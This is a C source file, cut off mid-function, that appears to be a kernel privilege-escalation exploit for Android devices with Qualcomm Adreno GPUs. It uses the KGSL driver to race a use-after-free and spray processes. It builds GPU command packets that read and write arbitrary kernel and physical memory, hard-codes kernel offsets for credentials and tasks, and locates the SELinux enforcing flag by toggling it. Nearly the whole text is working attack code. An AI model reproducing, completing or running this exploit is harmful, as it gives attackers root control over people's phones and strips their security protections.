#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/resource.h>

// ==================== РЕАЛЬНЫЕ СМЕЩЕНИЯ ДЛЯ ВАШЕГО ЯДРА ====================
// Updated with Batch Spray and Fast Scan optimizations
#define KERNEL_BASE          0xffffffc000000000ULL
#define SELINUX_OFFSET       0x02caa000ULL
#define INIT_CRED_OFFSET     0x018f9038ULL

#define OFFSET_PID           0x548
#define OFFSET_TGID          0x550
#define OFFSET_COMM          0x818
#define OFFSET_REAL_CRED     0x768
#define OFFSET_CRED          0x770
#define OFFSET_TASKS         0x3f0
#define OFFSET_FLAGS         0x00
#define OFFSET_STACK         0x08

#define TASK_PHYS           0x00000000000001f0ULL
#define PAGE_SIZE            4096
#define UAF_START            0x7001FF000ULL
#define UAF_SIZE             0x10004000ULL
#define UAF_SCAN_SIZE        0x04000000ULL
#define SCAN_PAGE_STEP       4U
#define SCAN_MAX_PAGES       4096U
#define SCAN_PROGRESS_EVERY  512U
#define OVERLAP_START        0x7001FE000ULL
#define OVERLAP_SIZE         0x00007000ULL
#define PLACEH_START         0x710204000ULL
#define PLACEH_SIZE          0x00010000ULL
#define BOGUS_START          0x700204000ULL
#define WRAP_SIZE            0xFFFFFFFFFFEFD000ULL

#define MARKER_NAME "KETO0422"
#define MAX_FOUND_PAGES 10

#define GBUF_TASK_VA         0xb08
#define GBUF_CRED_PTR        0xb10
#define GBUF_REAL_CRED_PTR   0xb18
#define GBUF_COMM_OFF        0xb20
#define GBUF_TARGET_PID      0x40
#define GBUF_FOUND_PID       0x300
#define GBUF_SET_TASKS       0x200
#define GBUF_SECOND_CHILD    0x900
#define GBUF_CALL_LOGLINE    0xff0
#define GBUF_CUR_PID         0xfa0
#define GBUF_MMAP_CORRUPT    0x9f8
#define GBUF_EX_OVER         0xffc
#define GBUF_TASK_SPRAY      0x901
#define GBUF_KBASE           0x80
#define GBUF_SELINUX         0x90
#define GBUF_PTE_SAVE        0xf00
#define GBUF_MMAP_CHECK      0xa00
#define GBUF_LIB_BASE        0x400
#define GBUF_SHELLCODE_ADDR  0x500

char *gbuf;
int fd;
int fd2;
int fd_lib;
int fd_shellcode;
struct stat st;
char check_flag[100] = {0};
unsigned long long gb_target_addr;
uint64_t selinux_enforcing;
uint64_t kernel_base = 0;
unsigned int g_uaf_id = 0;
uint64_t g_uaf_mmapsize = 0;
void *g_uaf_mmap_ptr = NULL;
uint64_t g_shellcode_va = 0;

static void flush_icache(void *addr, size_t len)
{
    __builtin___clear_cache((char *)addr, (char *)addr + len);
    __sync_synchronize();
}

static int gpu_read_task_struct(int fd, uint64_t task_va, uint8_t *buffer, size_t size);
static uint64_t find_kernel_base_auto(void);
static int gpu_write_task_virt(int fd, uint64_t dst_va, uint8_t *buffer, size_t size);
static int gpu_read_u32(int fd, uint64_t src_va, uint32_t *value);
static void hex_dump_internal(const char *desc, uint64_t addr, uint8_t *data, size_t size);

static uint64_t find_selinux_enforcing_via_kbase(int fd, uint64_t kbase) {
    if (kbase == 0) return 0;
    
    fprintf(stderr, "[SELINUX] Searching for enforcing bit near KBase 0x%lx...\n", (unsigned long)kbase);
    
    uint8_t page[4096];
    uint64_t found_addr = 0;

    // 1. Check popular offsets for Android 13 GKI 5.4 (ROG 5S specific)
    uint64_t common_offsets[] = { 
        SELINUX_OFFSET, 
        0x2f74ce8, 0x2f84ce8, 0x32aace8, 0x32a9ce8,
        0x2f64ce8, 0x2f54ce8, 0x30f6ce8, 0x24d90d0
    };
    for (int i = 0; i < 9; i++) {
        uint64_t test_va = kbase + common_offsets[i];
        uint32_t val = 0;
        if (gpu_read_task_struct(fd, test_va, (uint8_t *)&val, 4) == 0) {
            if (val == 1) {
                // Verify by toggling (safest way to confirm it's the right bit)
                uint32_t zero = 0;
                gpu_write_task_virt(fd, test_va, (uint8_t*)&zero, 4);
                uint32_t verify = 1;
                gpu_read_u32(fd, test_va, &verify);
                if (verify == 0) {
                    uint32_t one = 1;
                    gpu_write_task_virt(fd, test_va, (uint8_t*)&one, 4);
                    fprintf(stderr, "[SELINUX] FOUND & VERIFIED at 0x%lx (off 0x%lx)\n", 
                            (unsigned long)test_va, (unsigned long)common_offsets[i]);
                    return test_va;
                }
            }
        }
    }

    // 2. Scan ranges
    uint64_t scan_ranges[][2] = {
        {0x2f00000, 0x3200000},
        {0x3200000, 0x4000000},
        {0x2400000, 0x2f00000},
    };
    
    for (int r = 0; r < 3; r++) {
        uint64_t start = kbase + scan_ranges[r][0];
        uint64_t end = kbase + scan_ranges[r][1];
        fprintf(stderr, "[SELINUX] Scanning range 0x%lx - 0x%lx...", (unsigned long)start, (unsigned long)end);
        
        for (uint64_t addr = start; addr < end; addr += 4096) {
            if (gpu_read_task_struct(fd, addr, page, 4096) == 0) {
                uint32_t *u32 = (uint32_t *)page;
                for (int i = 0; i < 1024; i++) {
                    if (u32[i] == 1) {
                        uint64_t cand = addr + i * 4;
                        // Fast verification
                        uint32_t zero = 0;
                        gpu_write_task_virt(fd, cand, (uint8_t*)&zero, 4);
                        uint32_t verify = 1;
                        gpu_read_u32(fd, cand, &verify);
                        if (verify == 0) {
                            uint32_t one = 1;
                            gpu_write_task_virt(fd, cand, (uint8_t*)&one, 4);
                            fprintf(stderr, "\n[SELINUX] FOUND via scan at 0x%lx\n", (unsigned long)cand);
                            return cand;
                        }
                    }
                }
            }
            if ((addr - start) % (1024 * 1024) == 0) fprintf(stderr, ".");
        }
        fprintf(stderr, "\n");
    }
    
    return 0;
}

static uint64_t find_kernel_base_from_task_va(uint64_t task_va);
static uint64_t find_offsets_auto(uint64_t kernel_base);
static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_data, int data_size, int comm_off,
                                       uint64_t *out_cred_ptr, uint64_t *out_real_cred_ptr);
static uint64_t get_kernel_base(void);
#define WAIT_STEP_US 1000
#define WAIT_TIMEOUT_MS 300000

static int wait_for_flag_u8(volatile uint8_t *ptr, uint8_t value, unsigned int timeout_ms)
{
    unsigned int waited = 0;
    while (*ptr != value && waited < timeout_ms)
    {
        if (waited % 30000 == 0 && waited > 0) {
            fprintf(stderr, "[WAIT] Still waiting for flag (0x%x), elapsed: %u ms\n", value, waited);
        }
        usleep(WAIT_STEP_US);
        waited += WAIT_STEP_US / 1000;
    }
    return *ptr == value;
}

static int wait_for_flag_u64(volatile uint64_t *ptr, uint64_t value, unsigned int timeout_ms)
{
    unsigned int waited = 0;
    while (*ptr != value && waited < timeout_ms)
    {
        usleep(WAIT_STEP_US);
        waited += WAIT_STEP_US / 1000;
    }
    return *ptr == value;
}

uint8_t sig_num[] = {1, 3, 5, 7, 9};

#define KGSL_IOC_TYPE 0x09
#define FINDING 1
#define SPRAY_COUNT 40000
#define SPRAY_COUNT_STEP 100
#define SPRAY_COUNT_MAX 80000
#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR 0x00000002U

typedef struct
{
    pid_t pid;
    volatile int do_action;
    volatile int ready;
} spray_slot_t;

static spray_slot_t *spray_ctrl;
static int spray_count = SPRAY_COUNT;
static int spray_actual = 0;

static double get_ram_usage_percentage(void)
{
    FILE *fp = fopen("/proc/meminfo", "r");
    if (!fp)
        return 0.0;

    char line[256];
    unsigned long total_kb = 0;
    unsigned long avail_kb = 0;
    unsigned long zram_total = 0;
    
    while (fgets(line, sizeof(line), fp))
    {
        if (strncmp(line, "MemTotal:", 9) == 0)
            sscanf(line + 9, "%lu", &total_kb);
        else if (strncmp(line, "MemAvailable:", 13) == 0)
            sscanf(line + 13, "%lu", &avail_kb);
        else if (strncmp(line, "SwapTotal:", 10) == 0)
            sscanf(line + 10, "%lu", &zram_total);
    }
    fclose(fp);

    if (zram_total > 0) {
        static int warned = 0;
        if (!warned) {
            fprintf(stderr, "\n[!] WARNING: ZRAM/Virtual RAM detected (%lu KB). \n", zram_total);
            fprintf(stderr, "    This may cause page instability and scan failures.\n");
            fprintf(stderr, "    Recommended: Disable 'Memory Extension' in Developer Options.\n");
            warned = 1;
        }
    }

    if (total_kb == 0) return 0.0;
    double usage = (double)(total_kb - avail_kb) / (double)total_kb * 100.0;
    return usage;
}

static void reap_all_children(void)
{
    int status;
    pid_t pid;
    int reaped = 0;
    while ((pid = waitpid(-1, &status, WNOHANG)) > 0) {
        reaped++;
    }
    if (reaped > 0) fprintf(stderr, "    [+] Reaped %d zombie processes\n", reaped);
}

static int check_memory_available(void)
{
    FILE *fp = fopen("/proc/meminfo", "r");
    if (!fp)
        return 1;

    char line[256];
    unsigned long free_kb = 0;
    while (fgets(line, sizeof(line), fp))
    {
        if (strncmp(line, "MemAvailable:", 13) == 0)
        {
            sscanf(line + 13, "%lu", &free_kb);
            break;
        }
    }
    fclose(fp);

    fprintf(stderr, "[MEM] Available: %lu KB\n", free_kb);
    return free_kb >= 200000;
}

static int ensure_pid_in_spray_ctrl(pid_t pid)
{
    if (pid <= 0)
        return 0;

    int limit = (spray_actual > 0) ? spray_actual : spray_count;
    for (int i = 0; i < limit; i++)
    {
        if (spray_ctrl[i].pid == pid)
            return 1;
    }

    if (kill(pid, 0) != 0)
        return 0;

    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
    FILE *f = fopen(path, "r");
    if (!f)
        return 0;
    char comm[128] = {0};
    if (fgets(comm, sizeof(comm), f) == NULL)
    {
        fclose(f);
        return 0;
    }
    fclose(f);
    if (strstr(comm, MARKER_NAME) == NULL)
        return 0;

    for (int i = 0; i < limit; i++)
    {
        if (spray_ctrl[i].pid <= 0)
        {
            spray_ctrl[i].pid = pid;
            spray_ctrl[i].do_action = 1;
            spray_ctrl[i].ready = 1;
            fprintf(stderr, "      [!!!] Dynamically added PID %d to spray_ctrl slot %d\n", pid, i);
            return 1;
        }
    }

    return 0;
}

struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapsize;
    unsigned int id;
    unsigned int metadata_len;
    uint64_t metadata;
};

struct kgsl_gpuobj_free
{
    uint64_t flags;
    uint64_t priv;
    unsigned int id;
    unsigned int type;
    unsigned int len;
};

struct kgsl_map_user_mem
{
    int fd;
    unsigned long gpuaddr;
    size_t len;
    size_t offset;
    unsigned long hostptr;
    unsigned int memtype;
    unsigned int flags;
};

#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_MAP_USER_MEM _IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)

#define DEV_PATH "/dev/kgsl-3d0"

typedef struct
{
    int fd;
    volatile int ready;
    volatile int bogus_started;
    volatile int result;
    volatile int saved_errno;
} race_state_t;

#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_MEM 0x73

#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

struct kgsl_drawctxt_create
{
    unsigned flags, drawctxt_id;
};

struct kgsl_drawctxt_destroy
{
    unsigned int drawctxt_id;
};

#define IOCTL_KGSL_DRAWCTXT_DESTROY \
    _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)

struct kgsl_command_object
{
    uint64_t offset, gpuaddr, size;
    unsigned flags, id;
};

struct kgsl_gpu_command
{
    uint64_t flags, cmdlist;
    unsigned cmdsize, numcmds;
    uint64_t objlist;
    unsigned objsize, numobjs;
    uint64_t synclist;
    unsigned syncsize, numsyncs, context_id, timestamp;
};

struct kgsl_cmdstream_readtimestamp_ctxtid
{
    unsigned context_id, type, timestamp;
};

struct kgsl_gpuobj_info
{
    uint64_t gpuaddr, flags, size, va_len, va_addr;
    unsigned id;
};

#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID \
    _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

static inline uint32_t pm4_calc_odd_parity_bit(uint32_t val)
{
    return (0x9669u >> (0xFu & (val ^ (val >> 4) ^ (val >> 8) ^ (val >> 12) ^
                                (val >> 16) ^ (val >> 20) ^ (val >> 24) ^ (val >> 28)))) &
           1u;
}

static unsigned g_persistent_ctx_id = 0;
static unsigned g_persistent_ib_id = 0;
static void *g_persistent_ib_vma = NULL;
static uint64_t g_persistent_ib_gpu = 0;
static unsigned g_persistent_dst_id = 0;
static void *g_persistent_dst_vma = NULL;
static uint64_t g_persistent_dst_gpu = 0;

static int setup_gpu_persistent(int fd) {
    if (fd < 0) return -1;
    if (g_persistent_ctx_id != 0) return 0;
    
    struct kgsl_drawctxt_create ctx = {.flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    int retry = 30;
    while (retry--) {
        if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) == 0) {
            g_persistent_ctx_id = ctx.drawctxt_id;
            break;
        }
        if (retry % 5 == 0) fprintf(stderr, "[GPU] Waiting for context slot... (%d left)\n", retry);
        usleep(100000);
    }
    if (g_persistent_ctx_id == 0) return -1;

    struct kgsl_gpuobj_alloc ib_alloc = {.size = PAGE_SIZE * 8, .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) return -1;
    g_persistent_ib_id = ib_alloc.id;
    g_persistent_ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)g_persistent_ib_id) << 12);
    
    struct kgsl_gpuobj_info info = {.id = g_persistent_ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    g_persistent_ib_gpu = info.gpuaddr;

    struct kgsl_gpuobj_alloc dst_alloc = {.size = PAGE_SIZE * 2, .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0) return -1;
    g_persistent_dst_id = dst_alloc.id;
    g_persistent_dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)g_persistent_dst_id) << 12);
    info.id = g_persistent_dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    g_persistent_dst_gpu = info.gpuaddr;

    return 0;
}

static void cleanup_gpu_persistent(int fd) {
    if (g_persistent_ib_vma && g_persistent_ib_vma != MAP_FAILED)
        munmap(g_persistent_ib_vma, PAGE_SIZE * 8);
    if (g_persistent_dst_vma && g_persistent_dst_vma != MAP_FAILED)
        munmap(g_persistent_dst_vma, PAGE_SIZE * 2);
    
    struct kgsl_gpuobj_free fr = {0};
    if (g_persistent_ib_id) { fr.id = g_persistent_ib_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
    if (g_persistent_dst_id) { fr.id = g_persistent_dst_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
    
    if (g_persistent_ctx_id) {
        struct kgsl_drawctxt_destroy dctx = {.drawctxt_id = g_persistent_ctx_id};
        ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &dctx);
    }
    
    g_persistent_ctx_id = 0;
    g_persistent_ib_id = 0;
    g_persistent_dst_id = 0;
    g_persistent_ib_vma = NULL;
    g_persistent_dst_vma = NULL;
}

#define MMAP_SPRAY_COUNT 4000
#define MMAP_SPRAY_STRIDE 0x200000ULL
#define MMAP_SPRAY_BASE 0x0000000200000000ULL

#define PAGE_SHIFT 12
#define PAGE_MASK (~(PAGE_SIZE - 1))
#define PMD_SHIFT 21
#define PGDIR_SHIFT 30
#define PTRS_PER_PTE 512
#define PTRS_PER_PMD 512
#define PTRS_PER_PGD 512
#define PHYS_MASK ((1ULL << 48) - 1)

typedef struct
{
    uint64_t pgd;
} pgd_t;
typedef struct
{
    uint64_t pmd;
} pmd_t;
typedef struct
{
    uint64_t pte;
} pte_t;

#define pgd_index(addr) (((addr) >> PGDIR_SHIFT) & (PTRS_PER_PGD - 1))
#define pmd_index(addr) (((addr) >> PMD_SHIFT) & (PTRS_PER_PMD - 1))
#define pte_index(addr) (((addr) >> PAGE_SHIFT) & (PTRS_PER_PTE - 1))

#define pgd_val(x) ((x).pgd)
#define pmd_val(x) ((x).pmd)
#define pte_val(x) ((x).pte)

static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t cnt)
{
    return (7u << 28) | ((cnt & 0x3FFFu) << 0) | (pm4_calc_odd_parity_bit(cnt) << 15) | ((opcode & 0x7Fu) << 16) | (pm4_calc_odd_parity_bit(opcode) << 23);
}

static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi)
{
    *lo = (uint32_t)addr;
    *hi = (uint32_t)(addr >> 32);
}

static int wait_timestamp(int fd, unsigned ctx_id, unsigned target)
{
    struct kgsl_cmdstream_readtimestamp_ctxtid r = {0};
    r.context_id = ctx_id;
    r.type = KGSL_TIMESTAMP_RETIRED;

    for (unsigned spins = 0; spins < 100000; ++spins)
    {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0)
            return -1;
        if (r.timestamp >= target)
            return 0;
        usleep(100);
    }
    return -2;
}

static void *mmap_gpuobj_fixed(int fd, unsigned int id, uint64_t mmapsize, void *fixed_addr)
{
    off_t offset = ((off_t)id) << 12;
    size_t len = mmapsize;
    void *p = mmap(fixed_addr, len, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd, offset);
    return p;
}

static int gpu_write_phys(int fd, uint64_t phys_addr, uint32_t value)
{
    if (fd < 0)
    {
        fprintf(stderr, "[GPU_WRITE] Invalid fd: %d\n", fd);
        return -1;
    }

    fprintf(stderr, "[GPU_WRITE] start phys=0x%lx value=0x%x\n", (unsigned long)phys_addr, value);

    unsigned ctx_id = 0, ib_id = 0;
    uint64_t ib_gpu = 0;
    void *ib_vma = NULL;
    int result = -1;

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        fprintf(stderr, "[GPU_WRITE] Failed to create context\n");
        return -1;
    }
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
    {
        fprintf(stderr, "[GPU_WRITE] IB alloc failed\n");
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
    {
        fprintf(stderr, "[GPU_WRITE] IB mmap failed\n");
        goto cleanup;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    memset(ib_vma, 0, ib_alloc.mmapsize);

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    uint32_t d_lo, d_hi;
    split64(phys_addr, &d_lo, &d_hi);
    cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
    cmd[dw++] = d_lo;
    cmd[dw++] = d_hi;
    cmd[dw++] = value;

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    size_t ib_bytes = (size_t)dw * 4;
    msync(ib_vma, ib_bytes, MS_SYNC);

    struct kgsl_command_object obj = {
        .gpuaddr = ib_gpu,
        .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id};

    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
    gpu_cmd.cmdsize = sizeof(obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = ctx_id;

    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
        wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0)
    {
        result = 0;
        fprintf(stderr, "[GPU_WRITE] success phys=0x%lx value=0x%x\n", (unsigned long)phys_addr, value);
    }
    else
    {
        fprintf(stderr, "[GPU_WRITE] failed phys=0x%lx value=0x%x\n", (unsigned long)phys_addr, value);
    }

cleanup:
    if (ib_vma && ib_vma != MAP_FAILED)
        munmap(ib_vma, ib_alloc.mmapsize);
    if (ib_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (ctx_id)
    {
        struct kgsl_drawctxt_destroy dctx;
        dctx.drawctxt_id = ctx_id;
        ioctl(fd, _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy), &dctx);
    }

    return result;
}

static int gpu_write_phys_64(int fd, uint64_t phys_addr, uint64_t value)
{
    int ret = 0;
    ret |= gpu_write_phys(fd, phys_addr, (uint32_t)(value & 0xffffffff));
    ret |= gpu_write_phys(fd, phys_addr + 4, (uint32_t)(value >> 32));
    return ret;
}

static int gpu_read_phys(int fd, uint64_t phys_addr, uint8_t *buffer, size_t size)
{
    if (fd < 0)
    {
        fprintf(stderr, "[GPU_READ_PHYS] Invalid fd: %d\n", fd);
        return -1;
    }

    fprintf(stderr, "[GPU_READ_PHYS] start phys=0x%lx size=%zu\n", (unsigned long)phys_addr, size);

    if (size > 4096)
    {
        fprintf(stderr, "[GPU_READ_PHYS] Size too large: %zu, limiting to 4096\n", size);
        size = 4096;
    }

    unsigned ctx_id = 0, ib_id = 0, dst_id = 0;
    uint64_t ib_gpu = 0, dst_gpu = 0;
    void *ib_vma = NULL, *dst_vma = NULL;
    int result = -1;

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        fprintf(stderr, "[GPU_READ_PHYS] Failed to create context\n");
        return -1;
    }
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE * 8,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
    {
        fprintf(stderr, "[GPU_READ_PHYS] IB alloc failed\n");
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
    {
        fprintf(stderr, "[GPU_READ_PHYS] IB mmap failed\n");
        goto cleanup;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
    {
        fprintf(stderr, "[GPU_READ_PHYS] DST alloc failed\n");
        goto cleanup;
    }
    dst_id = dst_alloc.id;
    dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                   MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED)
    {
        fprintf(stderr, "[GPU_READ_PHYS] DST mmap failed\n");
        goto cleanup;
    }

    info.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;

    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    memset(ib_vma, 0, ib_alloc.mmapsize);
    memset(dst_vma, 0, dst_alloc.mmapsize);

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    int dwords = size / 4;
    if (dwords > 1024)
    {
        fprintf(stderr, "[GPU_READ_PHYS] Too many dwords: %d, limiting to 1024\n", dwords);
        dwords = 1024;
    }

    for (int i = 0; i < dwords; i++)
    {
        uint32_t d_lo, d_hi, s_lo, s_hi;
        split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
        split64(phys_addr + (uint64_t)i * 4, &s_lo, &s_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = s_lo;
        cmd[dw++] = s_hi;
    }

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    size_t ib_bytes = (size_t)dw * 4;
    msync(ib_vma, ib_bytes, MS_SYNC);

    struct kgsl_command_object obj = {
        .gpuaddr = ib_gpu,
        .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id};

    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
    gpu_cmd.cmdsize = sizeof(obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = ctx_id;

    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
        wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0)
    {
        msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);
        memcpy(buffer, dst_vma, size);
        result = 0;
        // Quiet mode: No more Successfully read logs here
    }
    else
    {
        fprintf(stderr, "[GPU_READ_PHYS] failed phys=0x%lx size=%zu\n", (unsigned long)phys_addr, size);
    }

cleanup:
    if (dst_vma && dst_vma != MAP_FAILED)
        munmap(dst_vma, dst_alloc.mmapsize);
    if (ib_vma && ib_vma != MAP_FAILED)
        munmap(ib_vma, ib_alloc.mmapsize);
    if (dst_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = dst_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (ib_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }

    return result;
}

static int gpu_read_task_struct(int fd, uint64_t task_va, uint8_t *buffer, size_t size)
{
    if (setup_gpu_persistent(fd) != 0) return -1;

    if (size > 4096) size = 4096;

    uint32_t *cmd = (uint32_t *)g_persistent_ib_vma;
    int dw = 0;
    memset(g_persistent_ib_vma, 0, PAGE_SIZE * 8);
    memset(g_persistent_dst_vma, 0, PAGE_SIZE * 2);

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    int dwords = size / 4;
    for (int i = 0; i < dwords; i++)
    {
        uint32_t d_lo, d_hi, s_lo, s_hi;
        split64(g_persistent_dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
        split64(task_va + (uint64_t)i * 4, &s_lo, &s_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = s_lo;
        cmd[dw++] = s_hi;
    }
    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    size_t ib_bytes = (size_t)dw * 4;
    msync(g_persistent_ib_vma, ib_bytes, MS_SYNC);

    struct kgsl_command_object obj = {
        .gpuaddr = g_persistent_ib_gpu,
        .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = g_persistent_ib_id};

    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
    gpu_cmd.cmdsize = sizeof(obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = g_persistent_ctx_id;

    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
        wait_timestamp(fd, g_persistent_ctx_id, gpu_cmd.timestamp) == 0)
    {
        msync(g_persistent_dst_vma, PAGE_SIZE, MS_SYNC | MS_INVALIDATE);
        memcpy(buffer, g_persistent_dst_vma, size);
        return 0;
    }
    return -1;
}

static int gpu_write_task_virt(int fd, uint64_t dst_va, uint8_t *buffer, size_t size)
{
    if (setup_gpu_persistent(fd) != 0) return -1;

    if (size > 4096) size = 4096;

    uint32_t *cmd = (uint32_t *)g_persistent_ib_vma;
    int dw = 0;
    memset(g_persistent_ib_vma, 0, PAGE_SIZE * 8);

